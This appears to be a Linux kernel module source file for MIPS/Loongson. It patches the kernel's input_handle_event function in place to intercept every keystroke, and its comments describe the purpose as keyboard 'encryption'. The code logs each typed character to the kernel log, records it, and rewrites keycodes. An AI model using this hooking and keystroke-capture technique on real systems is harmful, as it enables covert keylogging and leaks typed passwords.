//
// Created by CHM on 2021/4/10.
//

#include <linux/kernel.h>
#include <linux/input.h>

#include "common.h"

extern bool key_record_status;
extern spinlock_t record_index_lock;


unsigned long input_handle_event_hook_ret_addr; // hook完后，跳转到之后的指令继续执行，此变量记录此位置
unsigned long input_handle_event_hook_start_addr; // hook 开始的位置
unsigned long hook_addr;
unsigned long hook_ret_addr;
unsigned char ori_opcodes[16] = {0};

bool key_caps_status = false;   // 打开为true，关闭为false
bool key_shift_status = false;  // 按下为true，弹起为false
bool left_key_shift_status = false;  // 按下为true，弹起为false
bool right_key_shift_status = false;  // 按下为true，弹起为false
bool key_ctrl_status = false;   // ctrl 按下为true，弹起为false
bool left_key_ctrl_status = false;   // ctrl 按下为true，弹起为false
bool right_key_ctrl_status = false;   // ctrl 按下为true，弹起为false

bool g_can_hook = false; // 用来判断是否可以hook

// 正常的按键扫描码
unsigned char usb_kbd_keycode[256] = {
        0/*KEY_RESERVED*/, 1 /*KEY_ESC*/,
        '1', '2', '3', '4', '5', '6', '7', '8', '9',  '0',  '-', '=', 14/*KEY_BACKSPACE*/,
        15/*KEY_TAB*/, 'q', 'w', 'e', 'r', 't', 'y', 'u', 'i', 'o', 'p', '[', ']', 28/*KEY_ENTER*/,
        29/*KEY_LEFTCTRL*/, 'a', 's', 'd', 'f', 'g', 'h', 'j', 'k', 'l', ';', '\'', '`',
        42/*KEY_LEFTSHIFT*/, '\\',
        'z', 'x', 'c', 'v', 'b', 'n', 'm', ',', '.', '/', 54/*KEY_RIGHTSHIFT*/, 55/*KEY_KPASTERISK*/,
        56/*KEY_LEFTALT*/, ' '/*KEY_SPACE*/, 58/*KEY_CAPSLOCK*/,
        59/*KEY_F1*/, 60/*KEY_F2*/, 61/*KEY_F3*/, 62/*KEY_F4*/, 63/*KEY_F5*/, 64/*KEY_F6*/, 65/*KEY_F7*/, 66/*KEY_F8*/, 67/*KEY_F9*/, 68/*KEY_F10*/,
        69/*KEY_NUMLOCK*/, 70/*KEY_SCROLLLOCK*/, '7'/*KEY_KP7*/, '8', '9', '-'/*KEY_KPMINUS*/, '4', '5', '6', '+'/*KEY_KPPLUS*/, '1',
        '2', '3', '0', '.', 84, 85, 86, 87/*KEY_F11*/, 88/*KEY_F12*/
};

// 只激活了caps
unsigned char usb_kbd_keycode1[256] = {
        0/*KEY_RESERVED*/, 1 /*KEY_ESC*/,
        '1', '2', '3', '4', '5', '6', '7', '8', '9',  '0',  '-', '=', 14/*KEY_BACKSPACE*/,
        15/*KEY_TAB*/, 'Q', 'W', 'E', 'R', 'T', 'Y', 'U', 'I', 'O', 'P', '[', ']', 28/*KEY_ENTER*/,
        29/*KEY_LEFTCTRL*/, 'A', 'S', 'D', 'F', 'G', 'H', 'J', 'K', 'L', ';', '\'', '`',
        42/*KEY_LEFTSHIFT*/, '\\',
        'Z', 'X', 'C', 'V', 'B', 'N', 'M', ',', '.', '/', 54/*KEY_RIGHTSHIFT*/, 55/*KEY_KPASTERISK*/,
        56/*KEY_LEFTALT*/, ' '/*KEY_SPACE*/, 58/*KEY_CAPSLOCK*/,
        59/*KEY_F1*/, 60/*KEY_F2*/, 61/*KEY_F3*/, 62/*KEY_F4*/, 63/*KEY_F5*/, 64/*KEY_F6*/, 65/*KEY_F7*/, 66/*KEY_F8*/, 67/*KEY_F9*/, 68/*KEY_F10*/,
        69/*KEY_NUMLOCK*/, 70/*KEY_SCROLLLOCK*/, '7'/*KEY_KP7*/, '8', '9', '-'/*KEY_KPMINUS*/, '4', '5', '6', '+'/*KEY_KPPLUS*/, '1',
        '2', '3', '0', '.', 84, 85, 86, 87/*KEY_F11*/, 88/*KEY_F12*/
};

// 特殊符号扫描码 当只按下shift时，查找此表
unsigned char usb_kbd_special_keycode[256] = {
        0/*KEY_RESERVED*/, 1 /*KEY_ESC*/,
        '!', '@', '#', '$', '%', '^', '&', '*', '(',  ')',  '_', '+', 14/*KEY_BACKSPACE*/,
        15/*KEY_TAB*/, 'Q', 'W', 'E', 'R', 'T', 'Y', 'U', 'I', 'O', 'P', '{', '}', 28/*KEY_ENTER*/,
        29/*KEY_LEFTCTRL*/, 'A', 'S', 'D', 'F', 'G', 'H', 'J', 'K', 'L', ':', '"', '~',
        42/*KEY_LEFTSHIFT*/, '|',
        'Z', 'X', 'C', 'V', 'B', 'N', 'M', '<', '>', '?', 54/*KEY_RIGHTSHIFT*/, 55/*KEY_KPASTERISK*/,
        56/*KEY_LEFTALT*/, ' '/*KEY_SPACE*/, 58/*KEY_CAPSLOCK*/,
        59/*KEY_F1*/, 60/*KEY_F2*/, 61/*KEY_F3*/, 62/*KEY_F4*/, 63/*KEY_F5*/, 64/*KEY_F6*/, 65/*KEY_F7*/, 66/*KEY_F8*/, 67/*KEY_F9*/, 68/*KEY_F10*/,
        69/*KEY_NUMLOCK*/, 70/*KEY_SCROLLLOCK*/, '7'/*KEY_KP7*/, '8', '9', '-'/*KEY_KPMINUS*/, '4', '5', '6', '+'/*KEY_KPPLUS*/, '1',
        '2', '3', '0', '.', 84, 85, 86, 87/*KEY_F11*/, 88/*KEY_F12*/
};

// 特殊符号扫描码1 当shift和caps同时激活时，查询此表
unsigned char usb_kbd_special_keycode1[256] = {
        0/*KEY_RESERVED*/, 1 /*KEY_ESC*/,
        '!', '@', '#', '$', '%', '^', '&', '*', '(',  ')',  '_', '+', 14/*KEY_BACKSPACE*/,
        15/*KEY_TAB*/, 'q', 'w', 'e', 'r', 't', 'y', 'u', 'i', 'o', 'p', '{', '}', 28/*KEY_ENTER*/,
        29/*KEY_LEFTCTRL*/, 'a', 's', 'd', 'f', 'g', 'h', 'j', 'k', 'l', ':', '"', '~',
        42/*KEY_LEFTSHIFT*/, '|',
        'z', 'x', 'c', 'v', 'b', 'n', 'm', '<', '>', '?', 54/*KEY_RIGHTSHIFT*/, 55/*KEY_KPASTERISK*/,
        56/*KEY_LEFTALT*/, ' '/*KEY_SPACE*/, 58/*KEY_CAPSLOCK*/,
        59/*KEY_F1*/, 60/*KEY_F2*/, 61/*KEY_F3*/, 62/*KEY_F4*/, 63/*KEY_F5*/, 64/*KEY_F6*/, 65/*KEY_F7*/, 66/*KEY_F8*/, 67/*KEY_F9*/, 68/*KEY_F10*/,
        69/*KEY_NUMLOCK*/, 70/*KEY_SCROLLLOCK*/, '7'/*KEY_KP7*/, '8', '9', '-'/*KEY_KPMINUS*/, '4', '5', '6', '+'/*KEY_KPPLUS*/, '1',
        '2', '3', '0', '.', 84, 85, 86, 87/*KEY_F11*/, 88/*KEY_F12*/
};

void modify_current_key(void)
{
    unsigned long dev, type, code, value;
    __asm__ volatile(
    "move %0, $a0\n\t"
    :"=r"(dev)
    );
    __asm__ volatile(
    "move %0, $a1\n\t"
    :"=r"(type)
    );
    __asm__ volatile(
    "move %0, $a2\n\t"
    :"=r"(code)
    );
    __asm__ volatile(
    "move %0, $a3\n\t"
    :"=r"(value)
    );

    printk("%s dev = [%lx], type = [%lx], code = [%lx], value =[%lx]\n", __func__,
           dev, type, code, value);

    // 判断是否是键盘按键，和是否是需要加密键盘按键
    // 在此修改 code
    // 通过 type 判断 是否是键盘按键类型

    if (type == EV_KEY) {
        // 如果按下大小写切换键，就切换大小写状态
        if (code == KEY_CAPSLOCK && value == KEY_PRESSED) {
            key_caps_status = !key_caps_status;
        }

        // 如果按下了shift，按下为true，弹起为false
        if ((code == KEY_LEFTSHIFT) && value == KEY_PRESSED) {
            left_key_shift_status = true;
        }        
        if ((code == KEY_RIGHTSHIFT) && value == KEY_PRESSED) {
            right_key_shift_status = true;
        }

        if ((code == KEY_LEFTSHIFT) && value == KEY_RELEASED) {
            left_key_shift_status = false;
        }        
        if ((code == KEY_RIGHTSHIFT) && value == KEY_RELEASED) {
            right_key_shift_status = false;
        }

        key_shift_status = left_key_shift_status | right_key_shift_status;

        // 如果按下了ctrl，按下为true，弹起为false
        if ((code == KEY_LEFTCTRL) && value == KEY_PRESSED) {
            left_key_ctrl_status = true;
        }
        if ((code == KEY_RIGHTCTRL) && value == KEY_PRESSED) {
            right_key_ctrl_status = true;
        }

        if ((code == KEY_LEFTCTRL) && value == KEY_RELEASED) {
            left_key_ctrl_status = false;
        }        
        if ((code == KEY_RIGHTCTRL) && value == KEY_RELEASED) {
            right_key_ctrl_status = false;
        }

        key_ctrl_status = left_key_ctrl_status | right_key_ctrl_status;


        if (key_shift_status && key_caps_status) {
            // shift 和 cpas同时激活
            printk("%s current press key = [%c], status = [%s]\n", __func__, usb_kbd_special_keycode1[code], value ? "PRESSED":"RELEASED");
        } else if (!key_shift_status && key_caps_status) {
            // 只激活了caps
            printk("%s current press key = [%c], status = [%s]\n", __func__, usb_kbd_keycode1[code], value ? "PRESSED":"RELEASED");
        } else if (key_shift_status && !key_caps_status) {
            // 只激活了shift
            printk("%s current press key = [%c], status = [%s]\n", __func__, usb_kbd_special_keycode[code], value ? "PRESSED":"RELEASED");
        } else {
            // 最正常的扫描码，小写无特殊字符
            printk("%s current press key = [%c], status = [%s]\n", __func__, usb_kbd_keycode[code], value ? "PRESSED":"RELEASED");
        }


        // 可见字符记录及修改
        // 但当按下ctrl后，则不改，因为可能是快捷键
        if ( ((1 < code && code <= 14) || (15 < code && code < 28) ||
              (29 < code && code < 42) || (42 < code && code < 54) ||
              (70 < code && code < 84)) && !key_ctrl_status) {
            if (value) {
                if (key_shift_status && key_caps_status) {
                    // shift 和 cpas同时激活
                    key_store_record(usb_kbd_special_keycode1[code]);
                } else if (!key_shift_status && key_caps_status) {
                    // 只激活了caps
                    key_store_record(usb_kbd_keycode1[code]);
                } else if (key_shift_status && !key_caps_status) {
                    // 只激活了shift
                    key_store_record(usb_kbd_special_keycode[code]);
                } else {
                    // 最正常的扫描码，小写无特殊字符
                    key_store_record(usb_kbd_keycode[code]);
                }
                modify_current_key_method1(&code, 1);
            } else {
                modify_current_key_method1(&code, 0);
            }
        }
    }

    __asm__ volatile(
            "move $t0, $v0\n\t"
            );

    __asm__ volatile(
    "move $a2, %0\n\t"
    "move $v0, $t0\n\t"
    :
    :"r"(code)
    );
}

__attribute__ ((naked)) void my_input_handle_event(void)
{

    // 调用函数之后，把原来的ra改变了，所以需要保存原来的ra
    __asm__ volatile(
    //"sd $ra, ra_value\n\t"
    "daddiu $sp,$sp,-240\n\t"
    "sd $2, 0($sp)\n\t"
    "sd $3, 8($sp)\n\t"
    "sd $4, 16($sp)\n\t"
    "sd $5, 24($sp)\n\t"
    "sd $6, 32($sp)\n\t"
    "sd $7, 40($sp)\n\t"
    "sd $8, 48($sp)\n\t"
    "sd $9, 56($sp)\n\t"
    "sd $10, 64($sp)\n\t"
    "sd $11, 72($sp)\n\t"
    "sd $12, 80($sp)\n\t"
    "sd $13, 88($sp)\n\t"
    "sd $14, 96($sp)\n\t"
    "sd $15, 104($sp)\n\t"
    "sd $16, 112($sp)\n\t"
    "sd $17, 120($sp)\n\t"
    "sd $18, 128($sp)\n\t"
    "sd $19, 136($sp)\n\t"
    "sd $20, 144($sp)\n\t"
    "sd $21, 152($sp)\n\t"
    "sd $22, 160($sp)\n\t"
    "sd $23, 168($sp)\n\t"
    "sd $24, 176($sp)\n\t"
    "sd $25, 184($sp)\n\t"
    "sd $26, 192($sp)\n\t"
    "sd $27, 200($sp)\n\t"
    "sd $28, 208($sp)\n\t"
    "sd $30, 216($sp)\n\t"
    "sd $31, 224($sp)\n\t"
    "sd $1, 232($sp)\n\t"
    );
    __asm__ volatile(
    "jal modify_current_key\n\t"
    );
    __asm__ volatile(
    //"ld $ra, ra_value\n\t"
    "ld $2, 0($sp)\n\t"
    "ld $3, 8($sp)\n\t"
    "ld $4, 16($sp)\n\t"
    "ld $5, 24($sp)\n\t"
//    "ld $6, 32($sp)\n\t"          // 这个是a2寄存器
    "ld $7, 40($sp)\n\t"
    "ld $8, 48($sp)\n\t"
    "ld $9, 56($sp)\n\t"
    "ld $10, 64($sp)\n\t"
    "ld $11, 72($sp)\n\t"
    "ld $12, 80($sp)\n\t"
    "ld $13, 88($sp)\n\t"
    "ld $14, 96($sp)\n\t"
    "ld $15, 104($sp)\n\t"
    "ld $16, 112($sp)\n\t"
    "ld $17, 120($sp)\n\t"
    "ld $18, 128($sp)\n\t"
    "ld $19, 136($sp)\n\t"
    "ld $20, 144($sp)\n\t"
    "ld $21, 152($sp)\n\t"
    "ld $22, 160($sp)\n\t"
    "ld $23, 168($sp)\n\t"
    "ld $24, 176($sp)\n\t"
    "ld $25, 184($sp)\n\t"
    "ld $26, 192($sp)\n\t"
    "ld $27, 200($sp)\n\t"
    "ld $28, 208($sp)\n\t"
    "ld $30, 216($sp)\n\t"
    "ld $31, 224($sp)\n\t"
    "ld $1, 232($sp)\n\t"
    "daddiu $sp,$sp,240\n\t"
    );
    __asm__ volatile(
    "daddiu  $sp, -0x50\n\t"
    "sltiu   $v0, $a1, 0x17\n\t"
    "sd      $s0, 0x18($sp)\n\t"
    "swc2    $21, 0x13F($sp)\n\t"
    //                "move    $s1, $a0\n\t"
    //                "move    $a0, $s4\n\t"
    //                "sd      $s0, 8($sp)\n\t"
    //                "move    $s3, $a3\n\t"
    "nop\n\t"
    "nop\n\t"
    //	    "daddiu $sp,$sp,-64\n\t"
    //	    "sd $ra,56($sp)\n\t"
    //	    "sd $s5,48($sp)\n\t"
    //	    "sd $s4,40($sp)\n\t"
    "ld $t0,hook_ret_addr\n\t"
    "jr $t0\n\t"
    );
}

/*
 *  input_handle_event
.text:0000000120000C3C B0 FF BD 67                                   daddiu  $sp, -0x50                 // 从这开始
.text:0000000120000C40 17 00 A2 2C                                   sltiu   $v0, $a1, 0x17
.text:0000000120000C44 18 00 B0 FF                                   sd      $s0, 0x18($sp)
.text:0000000120000C48 3F 01 B5 EB                                   swc2    $21, 0x13F($sp)
.text:0000000120000C4C F4 00 B3 EB                                   swc2    $19, 0xF4($sp)             // 返回在这
.text:0000000120000C50 B2 00 B1 EB                                   swc2    $17, 0xB2($sp)
.text:0000000120000C54 A9 02 40 10                                   beqz    $v0, 0x1200016FC
.text:0000000120000C58 25 80 80 00                                   move    $s0, $a0
.text:0000000120000C5C 03 F8 A2 7C                                   dext    $v0, $a1, 0, 0x20  # ' '
.text:0000000120000C60 F8 18 02 00                                   dsll    $v1, $v0, 3
.text:0000000120000C64 B2 81 02 3C B0 60 42 64                       li      $v0, 0xFFFFFFFF81B260B0
.text:0000000120000C6C 03 18 42 D8                                   ldc2    $2, 0x1803($v0)
.text:0000000120000C70 25 88 A0 00                                   move    $s1, $a1
.text:0000000120000C74 25 98 C0 00                                   move    $s3, $a2
.text:0000000120000C78 08 00 40 00                                   jr      $v0
 * */

/*
 * input_event
.text:0000000120000B44 20 00 A2 2C                                   sltiu   $v0, $a1, 0x20
.text:0000000120000B48 2E 00 40 10                                   beqz    $v0, loc_120000C04
.text:0000000120000B4C 00 00 00 00                                   nop
.text:0000000120000B50 28 00 82 DC                                   ld      $v0, 0x28($a0)
.text:0000000120000B54 16 10 A2 00                                   dsrlv   $v0, $a1
.text:0000000120000B58 01 00 42 30                                   andi    $v0, 1
.text:0000000120000B5C 29 00 40 10                                   beqz    $v0, loc_120000C04
.text:0000000120000B60 00 00 00 00                                   nop
.text:0000000120000B64 C0 FF BD 67                                   daddiu  $sp, -0x40
.text:0000000120000B68 B4 00 B3 EB                                   swc2    $19, 0xB4($sp)
.text:0000000120000B6C E8 01 94 64                                   daddiu  $s4, $a0, 0x1E8
.text:0000000120000B70 72 00 B1 EB                                   swc2    $17, 0x72($sp)
.text:0000000120000B74 25 88 80 00                                   move    $s1, $a0           hook 范围在这5句感觉比较好
.text:0000000120000B78 25 20 80 02                                   move    $a0, $s4
.text:0000000120000B7C 08 00 B0 FF                                   sd      $s0, 8($sp)
.text:0000000120000B80 25 98 E0 00                                   move    $s3, $a3
.text:0000000120000B84 25 90 C0 00                                   move    $s2, $a2
.text:0000000120000B88 FF 00 B5 EB                                   swc2    $21, 0xFF($sp)
.text:0000000120000B8C 80 F4 68 0C                                   jal     0x121A3D200
.text:0000000120000B90 25 80 A0 00                                   move    $s0, $a1
 */

void install_hook_input_handle_event(void)
{
    unsigned long func_addr = kallsyms_lookup_name("input_handle_event");
	unsigned char sig_code[16] = {0xB0, 0xFF, 0xBD, 0x67, 0x17, 0x00, 0xA2, 0x2C, 0x18, 0x00, 0xB0, 0xFF, 0x3F, 0x01, 0xB5, 0xEB};
	int j = 0;
	for ( ; j < 16; j++){
		if (sig_code[j] != ((unsigned char *)func_addr)[j] ) {
			g_can_hook = false;
			return;
		}
	}

	g_can_hook = true;

    printk("%s input_handle_event addr = 0x%16lx\n", __func__, func_addr);

    // 从 input_handle_event +0x0 处进行hook
    hook_addr = func_addr + 0;
    hook_ret_addr = hook_addr + 16;

    unsigned long jmp_addr = &my_input_handle_event;
    // 这里是否需要再加偏移要看gcc对naked属性是否生效，需要编译出来用gdb查看一下
    // gcc version 8.3.0 (Uos 8.3.0.6-1+dde) 下 偏移为0
    jmp_addr += 0;
    printk("%s my_input_handle_event addr = 0x%16lx, jmp_addr = 0x%16lx\n", __func__, &my_input_handle_event, jmp_addr);
    printk("%s hook_addr = 0x%16lx\n", __func__, hook_addr);

    int i = 0;

    unsigned char * opcodes = (unsigned char *)hook_addr;

    // 保存原opcodes
    for (i = 0; i < 16; i++) {
        ori_opcodes[i] = opcodes[i];
    }

    unsigned char hook_opcodes[16] = {0x00, 0x00, 0x0c, 0x3c, 0x00, 0x00, 0x8c, 0x65,
                                      0x08, 0x00, 0x80, 0x01, 0x00, 0x00, 0x00, 0x00};
    unsigned short temp;
    temp = (unsigned short )jmp_addr;
    *((unsigned short *)&hook_opcodes[4]) = temp;
    temp = (unsigned short )((jmp_addr >> 16) & 0x0000ffffffffffff);
    *((unsigned short *)&hook_opcodes[0]) = temp;


    memcpy(hook_addr, hook_opcodes, 16);
}

void uninstall_hook_input_handle_event(void)
{
	if (g_can_hook) {
		// 卸载驱动时还原hook
		memcpy(hook_addr, ori_opcodes, 16);
	}
}
